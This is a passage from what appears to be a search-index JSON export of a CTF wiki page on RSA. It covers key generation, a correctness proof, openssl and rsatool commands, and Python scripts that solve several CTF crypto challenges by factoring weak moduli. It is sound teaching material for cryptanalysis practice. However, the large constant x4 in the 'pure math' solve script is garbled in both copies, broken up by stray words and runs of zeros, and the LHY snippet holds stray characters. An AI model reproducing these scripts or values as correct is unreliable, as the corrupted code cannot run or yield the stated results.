Attack.","title":"References"},{"location":"crypto/asymmetric/rsa/rsa_theory/","text":"RSA Introduction \u00b6 The RSA encryption algorithm is an asymmetric encryption algorithm. RSA is widely used in public key encryption and electronic commerce. The RSA was proposed in 1977 by Ron Rivest, Adi Shamir, and Leonard Adleman. The RSA is composed of the letters of the three names of the three of them. The reliability of the RSA algorithm is determined by the difficulty of maximizing integer factorization. In other words, the more difficult it is to factorize a very large integer, the more reliable the RSA algorithm is. If someone finds a fast factorization algorithm, the reliability of the information encrypted with RSA will definitely drop. But the possibility of finding such an algorithm is very small. Today, only short RSA keys can be broken down in a powerful way. As of 2017, there is no reliable way to attack the RSA algorithm. Fundamental \u00b6 Public key and private key generation \u00b6 Randomly select two different large prime numbers p p and q q to calculate N = p \\times q N = p \\times q According to the Euler function, find \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) Select an integer e e that is less than \\varphi (N) \\varphi (N) to make e e and \\varphi (N) \\varphi (N) mutually prime. And ask for e e about the inverse of \\varphi (N) \\varphi (N) , named d d , with ed\\equiv 1 \\pmod {\\varphi (N)} ed\\equiv 1 \\pmod {\\varphi (N)} Destroy records of p p and q q At this point, (N,e) (N,e) is the public key and (N,d) (N,d) is the private key. Message Encryption \u00b6 First, we need to convert the message into an integer m m using an agreed-upon protocol, such than m m is less than N N and m m is coprime to N N . If the message is too long, we can divide the message into several segments, which is what we call block encryption, and then encrypt each part with the following formula: m^{e}\\equiv c\\pmod N m^{e}\\equiv c\\pmod N Message decryption \u00b6 Use the private key d d to decrypt the message. c^{d}\\equiv m\\pmod N c^{d}\\equiv m\\pmod N Verification \u00b6 To verify m^{ed} \\equiv m \\bmod N m^{ed} \\equiv m \\bmod N , we use the fact that ed \\equiv 1 \\bmod \\phi(N) ed \\equiv 1 \\bmod \\phi(N) , then ed=k\\phi(N)+1 ed=k\\phi(N)+1 , it is sufficient to prove that m^{k\\phi(N)+1} \\equiv m \\bmod N m^{k\\phi(N)+1} \\equiv m \\bmod N We will prove it by considering two seperate cases In the first case, gcd(m,N)=1 gcd(m,N)=1 , hence m^{\\phi(N)} \\equiv 1 \\bmod N m^{\\phi(N)} \\equiv 1 \\bmod N , so the original claim is true. In the second case, gcd(m,N)\\neq 1 gcd(m,N)\\neq 1 , so m m must be a multiple of p p or q q , and since n=m n=m is less than N N , we can assume that m = xp m = xp Where x x must be less than q q . Since q q is a prime number, m^{\\phi(q)}\\equiv 1 \\bmod q m^{\\phi(q)}\\equiv 1 \\bmod q m^{k\\phi(N)} = m {k(p-1)(q-1)} = (m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q m^{k\\phi(N)} = m {k(p-1)(q-1)} = (m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q m^{k\\phi(N)+1}=m+uqm m^{k\\phi(N)+1}=m+uqm m^{k\\phi(N)+1}=m+uqxp=m+uxN m^{k\\phi(N)+1}=m+uqxp=m+uxN Hence it is proven to be correct. Basic Tools \u00b6 RSAtool \u00b6 Installation git clone https://github.com/ius/rsatool.git cd rsatool python rsatool.py -h Generate private key Python rsatool.py f FEM private.pem o p q 1234567 7654321 RSA Converter \u00b6 Generate a pem file based on a given key pair Obtain p p and q q from n n , e e , d d openssl \u00b6 View public key file openssl rsa -pubin -in pubkey.pem -text -modulus Decryption rsautl -decrypt -inkey private.pem -in flag.enc -out flag For more specific details, please refer to openssl --help . Decomposition Integer Tool \u00b6 Website decomposition, factor.db Command line decomposition, factordb-pycli , borrowing the factordb database. yafu python\u5e93 \u00b6 primefac \u00b6 The integer decomposition library contains many algorithms for integer decomposition. gmpy \u00b6 gmpy.root(a, b) , returns a tuple (x, y) , where x is the value of a open b power, y is the judgment x whether Boolean variable that is an integer gmpy2 \u00b6 When installing, you may need to install the mfpr and mpc libraries separately. gmpy2.iroot(a, b) , similar to gmpy.root(a,b) pycrypto \u00b6 Installation sudo pip install pycrypto use import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 msg = 'crypto here' p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) key = PKCS1_v1_5 . new ( privatekey ) msg = key . decrypt ( enc . decode ( 'base64' ), e ) Jarvis OJ - Basic - veryeasyRSA \u00b6 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 Find d = Please submit PCTF{d} Using ed\\equiv 1 \\pmod{\\varphi(N)} ed\\equiv 1 \\pmod{\\varphi(N)} , we can obtain d d from \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) . import gmpy2 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phin = ( p - 1 ) * ( q - 1 ) print gmpy2 . invert ( e , phin ) \u279c Jarvis OJ-Basic-veryeasyRSA git: ( master ) \u2717 python exp.py 19178568796155560423675975774142829153827883709027717723363077606260717434369 2018 CodeGate CTF Rsababy \u00b6 The program is a simple RSA, but the program also generates two strange numbers. e = 65537 n = p * q pi_n = ( p - 1 ) * ( q - 1 ) d = mulinv ( e , pi_n ) h = ( d + p ) ^ ( d - p ) g = d * ( p - 0xdeadbeef ) So, the problem should come from here, so let's start with it, let's assume that const = 0xdeadbeef . Then eg = ed * (p-const) eg = ed * (p-const) Furthermore, according to RSA 2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n 2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n 2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n 2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n So 2^{p-1} = 2^{eg} * 2^{const-1}+kn 2^{p-1} = 2^{eg} * 2^{const-1}+kn At the same time, according to Fermat's little theorem, we know 2^{p-1} \\equiv 1 \\pmod p 2^{p-1} \\equiv 1 \\pmod p So p|2^{p-1}-1 | 2^{eg+const-1}-1+kn p|2^{p-1}-1 | 2^{eg+const-1}-1+kn p|2^{eg+const-1}-1 p|2^{eg+const-1}-1 p|gcd(2^{eg+const-1}-1,n) p|gcd(2^{eg+const-1}-1,n) Hence the code is as follows tmp = gmpy2 . powmod ( 2 , e * g + const - 1 , n ) - 1 p = gmpy2 . gcd ( tmp , n ) q = n / p Phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) plain = gmpy2 . powmod ( data , d , n ) print hex ( plain )[ 2 :] . decode ( 'hex' ) 2018 National Security Week pure math \u00b6 The basic description of the topic is like this 1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 Now, what\u2019s the FLAG??? Our goal is basically to find FLAG, but how can we find it? This question requires us to be more familiar with number theory. From the content of the question, we can assume that p p , q q are both large prime numbers, so p^{q-1} \\equiv 1\\bmod q p^{q-1} \\equiv 1\\bmod q Then p^{q} \\equiv p \\bmod pq p^{q} \\equiv p \\bmod pq From 3), we know that p^q+q^p \\equiv p+q \\bmod pq p^q+q^p \\equiv p+q \\bmod pq And p+q p+q is obviously smaller than pq pq , so we know the value of p+q p+q . We let x_1 x_1 , x_2 x_2 , x_3 x_3 , x_4 x_4 , x_5 x_5 take the values of 1) to 5) respectively. From 4), we have (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq And because of 1) and 2), then p^pp \\equiv px_1\\bmod pq p^pp \\equiv px_1\\bmod pq q^qq \\equiv qx_2 \\bmod pq q^qq \\equiv qx_2 \\bmod pq therefore px_1+qx_2 \\equiv x_4 \\bmod pq px_1+qx_2 \\equiv x_4 \\bmod pq From the way x_1 x_1 and x_2 x_2 are obtained, we know that px_1+qx_2 px_1+qx_2 is also equal to x_4 x_4 , so we get a system of linear equations in two variables and can solve it directly. import gmpy2 x1 = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 X2 = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 p_q = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 x4 = 63112211860889153729 0034062380936348635813582583974823274634293429254290729072907052006074920060749 s729Readingly 97297499258793650 s 8392407 3105245 94071857 531058007 518 764 579 54 0 0 0 0 0 0 0 0 0 0 0 0 if ( x4 - x1 * p_q ) % ( x2 - x1 ) == 0 : print 'True' q = ( x4 - x1 * p_q ) / ( x2 - x1 ) print q p = p_q - q c = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 Phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 31337 , phin ) flag = gmpy2 . powmod ( c , d , p * q ) flag = hex ( flag )[ 2 :] print flag . decode ( 'hex' ) Flag is as follows \u279c 2018 -National Security Week first game-puremath git: ( master ) \u2717 python exp.py True 7635093784603905632817000902311635311970645531806863592697496927519352405158721310359124595712780726701027634372170535318453656286180828724079479352052417 flag { 6a66b8d5-6047-4299-a48e-4c4d1f874d12 } 2018 Pwnhub LHY \u00b6 First analyze this code assert gmpy . is_prime ( y ) ** 2016 + gmpy . is_prime ( x + 1 ) ** 2017 + ( ( x ** 2 - 1 ) ** 2 % ( 2 * x * y - 1 ) + 2 ) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 Since gmpy.is_prime either returns 1 or returns 0, we can easily try out that y y is a prime number, x+1 x+1 is also a prime number, and (x^2-1)^2 \\equiv 0 \\bmod(2xy-1) (x^2-1)^2 \\equiv 0 \\bmod(2xy-1) In order for the expression to be divisible, we guess that x=2y x=2y . So for the following code p = gmpy . next_prime ( x ** 3 + y ** 3 ) q = gmpy . next_prime ( x ** 2 * y + y ** 2 * x ) n = p * q phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( 0x10001 , phi ) enc = pow ( bytes_to_long ( flag ), 0x10001 , n ) print 'n =' , n print 'enc =' , enc p p and q q are naturally p=next\\_prime(9y^3) p=next\\_prime(9y^3) q=next\\_prime(6y^3) q=next\\_prime(6y^3) According to the interval of prime numbers, we know that p p and q q are at most a little larger than the numbers in parentheses, and generally would not exceed 1000 1000 here. Then n \\geq 54y^6 n \\geq 54y^6 So we know the upper bound of y y , and the lower bound of y y is actually not too far from the upper bound, we probably reduce hundreds of thousands. Hence, we use binary search to find p p and q q , as follows import gmpy2 tmp = 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 print gmpy2 . iroot ( tmp , 2018 ) print gmpy2 . iroot ( tmp - 1 , 2018 ) print gmpy2 . iroot ( tmp - 2 , 2018 ) n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741 y = 191904757378974300059526915134037747982760255307942501070454569331878491189601823952845623286161325306079772871025816081849039036850918375408172174102720702781463514549851887084613000000 L y = gmpy2 . next_prime ( y ) enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612 end = gmpy2 . iroot ( n / 54 , 6 )[ 0 ] beg = end - 2000000 mid = 1 while beg < end : mid = ( beg + end ) / 2 if gmpy2 . is_prime ( mid ) != 1 : mid = gmpy2 . next_prime ( mid ) p = gmpy2 . next_prime ( 9 * mid ** 3 ) q = gmpy2 . next_prime ( 6 * mid ** 3 ) n1 = p * q if n1 == n : print p , q phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 0x10001 , phin ) m = gmpy2 . powmod ( enc , d , n ) print hex ( m )[ 2 :] . strip ( 'L' ) . decode ( 'hex' ) print 'ok' exit ( 0 ) elif n1 < n : beg = mid else : end = mid print beg , end","title":"RSA Introduction"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsa-introduction","text":"The RSA encryption algorithm is an asymmetric encryption algorithm. RSA is widely used in public key encryption and electronic commerce. The RSA was proposed in 1977 by Ron Rivest, Adi Shamir, and Leonard Adleman. The RSA is composed of the letters of the three names of the three of them. The reliability of the RSA algorithm is determined by the difficulty of maximizing integer factorization. In other words, the more difficult it is to factorize a very large integer, the more reliable the RSA algorithm is. If someone finds a fast factorization algorithm, the reliability of the information encrypted with RSA will definitely drop. But the possibility of finding such an algorithm is very small. Today, only short RSA keys can be broken down in a powerful way. As of 2017, there is no reliable way to attack the RSA algorithm.","title":"RSA Introduction"},{"location":"crypto/asymmetric/rsa/rsa_theory/#fundamental","text":"","title":"Fundamental"},{"location":"crypto/asymmetric/rsa/rsa_theory/#public-key-and-private-key-generation","text":"Randomly select two different large prime numbers p p and q q to calculate N = p \\times q N = p \\times q According to the Euler function, find \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) Select an integer e e that is less than \\varphi (N) \\varphi (N) to make e e and \\varphi (N) \\varphi (N) mutually prime. And ask for e e about the inverse of \\varphi (N) \\varphi (N) , named d d , with ed\\equiv 1 \\pmod {\\varphi (N)} ed\\equiv 1 \\pmod {\\varphi (N)} Destroy records of p p and q q At this point, (N,e) (N,e) is the public key and (N,d) (N,d) is the private key.","title":"Public key and private key generation"},{"location":"crypto/asymmetric/rsa/rsa_theory/#message-encryption","text":"First, we need to convert the message into an integer m m using an agreed-upon protocol, such than m m is less than N N and m m is coprime to N N . If the message is too long, we can divide the message into several segments, which is what we call block encryption, and then encrypt each part with the following formula: m^{e}\\equiv c\\pmod N m^{e}\\equiv c\\pmod N","title":"Message Encryption"},{"location":"crypto/asymmetric/rsa/rsa_theory/#message-decryption","text":"Use the private key d d to decrypt the message. c^{d}\\equiv m\\pmod N c^{d}\\equiv m\\pmod N","title":"Message decryption"},{"location":"crypto/asymmetric/rsa/rsa_theory/#verification","text":"To verify m^{ed} \\equiv m \\bmod N m^{ed} \\equiv m \\bmod N , we use the fact that ed \\equiv 1 \\bmod \\phi(N) ed \\equiv 1 \\bmod \\phi(N) , then ed=k\\phi(N)+1 ed=k\\phi(N)+1 , it is sufficient to prove that m^{k\\phi(N)+1} \\equiv m \\bmod N m^{k\\phi(N)+1} \\equiv m \\bmod N We will prove it by considering two seperate cases In the first case, gcd(m,N)=1 gcd(m,N)=1 , hence m^{\\phi(N)} \\equiv 1 \\bmod N m^{\\phi(N)} \\equiv 1 \\bmod N , so the original claim is true. In the second case, gcd(m,N)\\neq 1 gcd(m,N)\\neq 1 , so m m must be a multiple of p p or q q , and since n=m n=m is less than N N , we can assume that m = xp m = xp Where x x must be less than q q . Since q q is a prime number, m^{\\phi(q)}\\equiv 1 \\bmod q m^{\\phi(q)}\\equiv 1 \\bmod q m^{k\\phi(N)} = m {k(p-1)(q-1)} = (m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q m^{k\\phi(N)} = m {k(p-1)(q-1)} = (m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q m^{k\\phi(N)+1}=m+uqm m^{k\\phi(N)+1}=m+uqm m^{k\\phi(N)+1}=m+uqxp=m+uxN m^{k\\phi(N)+1}=m+uqxp=m+uxN Hence it is proven to be correct.","title":"Verification"},{"location":"crypto/asymmetric/rsa/rsa_theory/#basic-tools","text":"","title":"Basic Tools"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsatool","text":"Installation git clone https://github.com/ius/rsatool.git cd rsatool python rsatool.py -h Generate private key Python rsatool.py f FEM private.pem o p q 1234567 7654321","title":"RSAtool"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsa-converter","text":"Generate a pem file based on a given key pair Obtain p p and q q from n n , e e , d d","title":"RSA Converter"},{"location":"crypto/asymmetric/rsa/rsa_theory/#openssl","text":"View public key file openssl rsa -pubin -in pubkey.pem -text -modulus Decryption rsautl -decrypt -inkey private.pem -in flag.enc -out flag For more specific details, please refer to openssl --help .","title":"openssl"},{"location":"crypto/asymmetric/rsa/rsa_theory/#decomposition-integer-tool","text":"Website decomposition, factor.db Command line decomposition, factordb-pycli , borrowing the factordb database. yafu","title":"Decomposition Integer Tool"},{"location":"crypto/asymmetric/rsa/rsa_theory/#python","text":"","title":"python\u5e93"},{"location":"crypto/asymmetric/rsa/rsa_theory/#primefac","text":"The integer decomposition library contains many algorithms for integer decomposition.","title":"primefac"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy","text":"gmpy.root(a, b) , returns a tuple (x, y) , where x is the value of a open b power, y is the judgment x whether Boolean variable that is an integer","title":"gmpy"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy2","text":"When installing, you may need to install the mfpr and mpc libraries separately. gmpy2.iroot(a, b) , similar to gmpy.root(a,b)","title":"gmpy2"},{"location":"crypto/asymmetric/rsa/rsa_theory/#pycrypto","text":"Installation sudo pip install pycrypto use import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 msg = 'crypto here' p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) key = PKCS1_v1_5 . new ( privatekey ) msg = key . decrypt ( enc . decode ( 'base64' ), e )","title":"pycrypto"},{"location":"crypto/asymmetric/rsa/rsa_theory/#jarvis-oj-basic-veryeasyrsa","text":"p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 Find d = Please submit PCTF{d} Using ed\\equiv 1 \\pmod{\\varphi(N)} ed\\equiv 1 \\pmod{\\varphi(N)} , we can obtain d d from \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) . import gmpy2 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phin = ( p - 1 ) * ( q - 1 ) print gmpy2 . invert ( e , phin ) \u279c Jarvis OJ-Basic-veryeasyRSA git: ( master ) \u2717 python exp.py 19178568796155560423675975774142829153827883709027717723363077606260717434369","title":"Jarvis OJ - Basic - veryeasyRSA"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-codegate-ctf-rsababy","text":"The program is a simple RSA, but the program also generates two strange numbers. e = 65537 n = p * q pi_n = ( p - 1 ) * ( q - 1 ) d = mulinv ( e , pi_n ) h = ( d + p ) ^ ( d - p ) g = d * ( p - 0xdeadbeef ) So, the problem should come from here, so let's start with it, let's assume that const = 0xdeadbeef . Then eg = ed * (p-const) eg = ed * (p-const) Furthermore, according to RSA 2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n 2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n 2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n 2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n So 2^{p-1} = 2^{eg} * 2^{const-1}+kn 2^{p-1} = 2^{eg} * 2^{const-1}+kn At the same time, according to Fermat's little theorem, we know 2^{p-1} \\equiv 1 \\pmod p 2^{p-1} \\equiv 1 \\pmod p So p|2^{p-1}-1 | 2^{eg+const-1}-1+kn p|2^{p-1}-1 | 2^{eg+const-1}-1+kn p|2^{eg+const-1}-1 p|2^{eg+const-1}-1 p|gcd(2^{eg+const-1}-1,n) p|gcd(2^{eg+const-1}-1,n) Hence the code is as follows tmp = gmpy2 . powmod ( 2 , e * g + const - 1 , n ) - 1 p = gmpy2 . gcd ( tmp , n ) q = n / p Phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) plain = gmpy2 . powmod ( data , d , n ) print hex ( plain )[ 2 :] . decode ( 'hex' )","title":"2018 CodeGate CTF Rsababy"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-national-security-week-pure-math","text":"The basic description of the topic is like this 1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 Now, what\u2019s the FLAG??? Our goal is basically to find FLAG, but how can we find it? This question requires us to be more familiar with number theory. From the content of the question, we can assume that p p , q q are both large prime numbers, so p^{q-1} \\equiv 1\\bmod q p^{q-1} \\equiv 1\\bmod q Then p^{q} \\equiv p \\bmod pq p^{q} \\equiv p \\bmod pq From 3), we know that p^q+q^p \\equiv p+q \\bmod pq p^q+q^p \\equiv p+q \\bmod pq And p+q p+q is obviously smaller than pq pq , so we know the value of p+q p+q . We let x_1 x_1 , x_2 x_2 , x_3 x_3 , x_4 x_4 , x_5 x_5 take the values of 1) to 5) respectively. From 4), we have (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq And because of 1) and 2), then p^pp \\equiv px_1\\bmod pq p^pp \\equiv px_1\\bmod pq q^qq \\equiv qx_2 \\bmod pq q^qq \\equiv qx_2 \\bmod pq therefore px_1+qx_2 \\equiv x_4 \\bmod pq px_1+qx_2 \\equiv x_4 \\bmod pq From the way x_1 x_1 and x_2 x_2 are obtained, we know that px_1+qx_2 px_1+qx_2 is also equal to x_4 x_4 , so we get a system of linear equations in two variables and can solve it directly. import gmpy2 x1 = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 X2 = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 p_q = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 x4 = 63112211860889153729 0034062380936348635813582583974823274634293429254290729072907052006074920060749 s729Readingly 97297499258793650 s 8392407 3105245 94071857 531058007 518 764 579 54 0 0 0 0 0 0 0 0 0 0 0 0 if ( x4 - x1 * p_q ) % ( x2 - x1 ) == 0 : print 'True' q = ( x4 - x1 * p_q ) / ( x2 - x1 ) print q p = p_q - q c = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 Phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 31337 , phin ) flag = gmpy2 . powmod ( c , d , p * q ) flag = hex ( flag )[ 2 :] print flag . decode ( 'hex' ) Flag is as follows \u279c 2018 -National Security Week first game-puremath git: ( master ) \u2717 python exp.py True 7635093784603905632817000902311635311970645531806863592697496927519352405158721310359124595712780726701027634372170535318453656286180828724079479352052417 flag { 6a66b8d5-6047-4299-a48e-4c4d1f874d12 }","title":"2018 National Security Week pure math"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-pwnhub-lhy","text":"First analyze this code assert gmpy . is_prime ( y ) ** 2016 + gmpy . is_prime ( x + 1 ) ** 2017 + ( ( x ** 2 - 1 ) ** 2 % ( 2 * x * y - 1 ) + 2 ) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 Since gmpy.is_prime either returns 1 or returns 0, we can easily try out that y y is a prime number, x+1 x+1 is also a prime number, and (x^2-1)^2 \\equiv 0 \\bmod(2xy-1) (x^2-1)^2 \\equiv 0 \\bmod(2xy-1) In order for the expression to be divisible, we guess that x=2y x=2y . So for the following code p = gmpy . next_prime ( x ** 3 + y ** 3 ) q = gmpy . next_prime ( x ** 2 * y + y ** 2 * x ) n = p * q phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( 0x10001 , phi ) enc = pow ( bytes_to_long ( flag ), 0x10001 , n ) print 'n =' , n print 'enc =' , enc p p and q q are naturally p=next\\_prime(9y^3) p=next\\_prime(9y^3) q=next\\_prime(6y^3) q=next\\_prime(6y^3) According to the interval of prime numbers, we know that p p and q q are at most a little larger than the numbers in parentheses, and generally would not exceed 1000 1000 here. Then n \\geq 54y^6 n \\geq 54y^6 So we know the upper bound of y y , and the lower bound of y y is actually not too far from the upper bound, we probably reduce hundreds of thousands. Hence, we use binary search to find p p and q q , as follows import gmpy2 tmp = 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 print gmpy2 . iroot ( tmp , 2018 ) print gmpy2 . iroot ( tmp - 1 , 2018 ) print gmpy2 . iroot ( tmp - 2 , 2018 ) n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741 y = 191904757378974300059526915134037747982760255307942501070454569331878491189601823952845623286161325306079772871025816081849039036850918375408172174102720702781463514549851887084613000000 L y = gmpy2 . next_prime ( y ) enc = 